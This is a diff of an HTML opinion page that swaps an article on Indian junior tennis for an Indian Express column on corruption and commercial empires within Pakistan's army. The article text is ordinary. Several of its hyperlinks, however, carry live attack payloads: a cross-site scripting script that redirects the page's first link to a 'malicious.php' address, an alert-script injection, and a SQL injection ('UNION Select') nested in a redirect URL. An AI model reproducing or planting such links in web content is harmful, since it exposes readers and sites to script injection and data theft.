@@ -16,54 +16,45 @@
 
 
 <div class="single">
-<h2>Talent for the game, but why Indian athletes fail on the world stage </h2>
+<h2>Soldiers and businessmen Pakistan army has a battle to win: The corruption within</h2>
 
 
 
-<p class="details"> Aug 25, 2016 11:18 IST|Ajai Pasricha|<a href="#">Hindustan Times</a> </p>
-<h2 align="right"><a href="20160824-opinion.php"> Previous </a> </h2>
-
-
-
+<p class="details">By Christophe Jaffrelot|August 26,2016 12:04am IST <a href="#">Indianexpres</a> </p>
+<h2 align="right"><a href="20160825-opinion.php"> Previous </a> </h2>
 
 <p>
 <a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank"> 
-In its tennis pool, India has at least 10 potential champions </a> in the age bracket of 12-18. The question is: Will their promise blossom into a victory dance at the next Olympics? Unlikely. History tells us each one will stumble when the time comes to step up from the junior ranks. The reason: Inadequate exposure to the pace and power of international competition. Only if potential champions can pit their skills against the world’s best players in their age group will they vault into the orbit of current sporting standards. That happens in cricket but nowhere else. Whether tennis, athletics, archery, basketball, cycling, fencing, wrestling, weightlifting, volleyball, boxing, soccer, golf, gymnastics, martial arts or swimming, the athletes of India are almost always denied the basic vitamins of progress by those that govern each federation.</p>
-<p>
-Each federation president seems to think that coaching, fitness, advanced practice drills and local competitions will do the trick. They’re mistaken. This formula merely creates a skeletal foundation; it doesn’t build an Olympic champion. 
-
-</p>
-
-<p>
-Let’s talk tennis. Rudiments of the game are taught at the age of seven or eight. Thereafter, the trek to the national stage takes not less than 21,480 hours of donkeywork spread over ten long years. In the course of that extended journey, three thousand-rupee shoes wear out every six weeks, twelve-dozen tennis balls are reduced to eggshells each month and racquet guts break every third day.
+When a Pakistani chief of army staff (COAS) </a> usurps power from a civilian government, he justifies his action by claiming — among other things — that the civilians lack integrity. Pervez Musharraf was no exception. In 1999, he issued a National Accountability Order (NAO) reminiscent of Ayub Khan’s 1959 Elective Bodies Disqualification Order (EBDO) that offered politicians suspected of corruption the choice of either going on trial or retiring from politics. The NAO led to the establishment of a National Accountability Bureau (NAB), which launched an anti-corruption campaign that targeted, among others, Benazir Bhutto.
 </p><p>
-Hundreds of kids from middle class homes pack their tennis bags each morning not knowing what the morning will bring: a stride closer to their goal or a slide further away. Reputations are won and lost over two hours of battle. In the life of emerging tennis players, heartbreak and success go hand in hand.
-</p><p>
-They practice for hours through the searing heat of summer, immune to the sun, their fine-tuned limbs and torsos reacting faster with each passing day. They work on their technique under the watchful gaze of an anxious coach who breaks down their game into a handbook of statistics: Winners, unforced errors, double-faults and aces, each one a measure of performance.
+Today, the military is not in office and cannot go so far, but they continue to obliquely expose the lack of scruples of civilian rulers and cultivate a reputation for probity. Last spring, COAS Raheel Sharif made a very shrewd use of the Panama Papers, which had compromised the reputation of Prime Minister Nawaz Sharif. He asked the PM — whose declared assets had doubled in four years to around Rs 2 billion (in Pakistani rupees) — to resolve the Panama issue, thereby forcing him on the defensive. To show his commitment to clean public service, the COAS dismissed six army officers, including two generals, for corruption, after he said in a widely-publicised speech that “across the board accountability is necessary for the solidarity, integrity and prosperity of Pakistan”. This unpredented move was intended to show the world that the army knew how to clean up its ranks while the politicians were unable to book the corrupt.
 </p><p>
 <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three">
-The tennis court becomes an open classroom </a> where lessons are drawn from the curricula of life. “What you learn from losing, you can’t learn from winning,” says a coach. “A loss is more of a gain than a win. Try explaining this to your parents.”
+The scam that forced the COAS to act concerns the illegal investment </a> of three to four billion rupees in the stock market by the National Logistics Cell, a transport company involved in road construction with more than 7,200 people, including 2,500 serving military personnel, on its rolls.
 </p><p>
-Parental pressures weigh heavily on young shoulders. When cracks appear from the burden of losing, a mental fitness trainer props up the mind, instilling positive thoughts in a player who has everything else: every shot in the book, every muscle in perfect working order, except the one between the ears. That needs to be strengthened.
+Many similar scams have come to the light in recent months. Earlier this year, Amjad Kayani, retired brigadier and brother of former COAS, Ashfaq Pervez Kayani, was summoned by the NAB for his alleged involvment in a scam implicating the Defence House Authority (DHA). In 2009, the DHA had launched a project near Lahore, the “DHA City”, that was supposed to provide accommodation for families of soldiers — primarily the war-wounded and “martyrs” — in recognition of their services to the nation. The company of another brother of Ashfaq Pervez Kayani, Kamran Kayani, Elysium Holdings, was commissioned by the DHA to acquire land. But it failed to deliver for six years despite receiving payment from the public, which led the DHA to lodge a complaint with the NAB. Last month, the NAB issued an arrest warrant for Kamran Kayani.
 </p><p>
 <a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>"target="_blank"> 
-Despite unusually high fitness levels,</a> physical injuries strike without warning or mercy. When young feet pound hard courts for years on end, the result often is a shin splint, a stress fracture, a torn hamstring or a muscle strain. A month’s break from the game is the only remedy. Return to form is both slow and painful.
+Kayani has since been cleared of any involvement,</a> but the scam is for real. In 2016, another DHA-related scam regarding a farm house project near Islamabad resulted in the arrest of two other ex-army men who were accused by the NAB “for misusing their authority by selling illegal allotment certificates of DHA Islamabad”.
 </p><p>
-Indians have proved time and again they can be world beaters: Leander Paes
+These cases reflect growing involvement of (ex-) army men in businesses, a process that, as Ayesha Siddiqa has shown, resulted in the making of “Military Inc.”, an enterprise with investment worth $10bn in land and $10bn in private assets. Today the military controls one-third of all heavy industry manufacturing in Pakistan. This development started with the creation of foundations, the oldest and largest being the Fauji Foundation (FF), which was started by the ministry of defence in 1954. The FF’s initial mission was to ensure the welfare of soldiers but it developed its own enterprises, from sugar mills to cement factories. The army took the cue and set up its foundation, the Army Welfare Trust, in 1971. The air force followed and established the Shaheen Foundation in 1977 (which manufactures a wide variety of products including pharmaceuticals and shoes). Not to be left out, the navy established the Bahria Foundation in 1982 (which aside from manufacturing paint is also involved in industrial bread-making). Last month, Defence Minister Khawaja Asif informed the upper house that the army runs 50 commercial entities, including banks.
 </p><p>
-The life of a young tennis player is punctuated with moments of uncertainty followed by periods of success in cycles of unpredictable length. Most parents never come to terms with this fact. They expect their children to win each time they step on to court. Fathers have been known to thrash their daughters when they lose. Those scars never heal.
+<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three">
+Today, among the most profitable activities of the military is real estate development.</a> The military used to convert training grounds in major cantonments into residential areas. Nowadays, (ex-) army men have become a part of speculative real estate operations. Some of them are associated with Malik Riaz, whose rise as a realtor would not have been possible without powerful patrons.
 </p><p>
+Riaz, the 12th richest man in Pakistan, helms the largest private realty firm in the country, Bahria Town. This company made a fortune by developing gated communities and even private cities across Pakistan. How did Riaz get land for his projects? Many suspect he got illicit support from within the army. He has himself claimed he bribed decision-makers — including politicians, judges and ISI officers. Bahria Town’s policy of recruting (ex-)army men in large numbers may also have helped. Last but not the least, this company has established joint ventures with military entities, including DHA, which makes land acquisition easier.
+</p><p>
+Some of these collaborations have come under a cloud. For instance, the DHA Valley project in Islamabad. According to NAB, “about 30,000 kanal (DHA) land was transferred to Bahria Town without the approval of the competent authority”. So, 1,10,000 civilians and 41,000 serving and retired army men, who had paid instalments, suffered. The army had to do damage control, especially after a Dawn report alleged that Riaz’s son was named in the Panama Papers and linked him to Raheel Sharif.
+</p><p>
+A few days before axing the corrupt officers in April last, the COAS had made another unprecedented move: He donated his plots in Lahore and Islamabad (their value was estimated to be over Rs 450 million to the Shuhada Foundation (benefiting the “martyrs” of the army and their families). At the same time, Riaz, reportedly at the request of Sharif, returned more than Rs 55bn to DHA.
+</p><p>
+<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three">
+Are these moves sufficient to redeem the Pakistani army’s reputation,</a> the most popular institution in the country according to the last PILDAT (Pakistan Institute of Legislative Development and Transparency) survey in September 2015 with an approval rating of above 75 per cent (as against 35 per cent to the political parties)? Tough to predict, but the fact is the balance of power in Islamabad/Rawalpindi depends on the military’s capacity to maintain a clean image.
 
-The long hard grind might make a national champion but not an Olympic medal winner. To rise on the international stage, Indian players must draw lessons from playing faster, stronger competitors from across the world. All sports federations must set aside funds for this purpose. Only then will our champions be graduates of a global finishing school, ready to compete at the Olympic level.
-</p><p>
-<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three">Playing the circuit in Europe can cost as much as three lakhs of rupees a week </a>, way beyond the means of the average parent. In light of this, most parents choose the soft option: American universities that offer sports scholarships to world-ranked juniors.
-</p><p>
-When homegrown sportspersons of high potential move to the US in search of international competition, the loser is India. This talent drain can only be plugged if sports federations fund the participation of juniors in high-profile global events. That’s what other sporting nations do--either at government expense or through private sponsorships. That’s why those countries have a growing band of junior athletes who carry the stamp of potential world-beaters-- and India doesn’t.
-</p><p>
-In the opinion of the professional in charge of the Swedish Junior Tennis Program, several juniors in India are “technically among the world’s best in shot making but they lack two essentials: speed and power.” How can they acquire these skills? Pat comes the answer: “Through Spanish drills and playing overseas.”
 </p><p><i>
-(Ajai Pasricha, the father of a tennis player, is a communications consultant and   an advertising professional of 36 years standing. He can be contacted at ajaipasricha@gmail.com. The views expressed are personal.)
+The writer is senior research fellow at CERI-Sciences Po/CNRS, Paris, professor of Indian Politics and Sociology at King’s India Institute, London
 </i></p>
+
 
 </div>
 
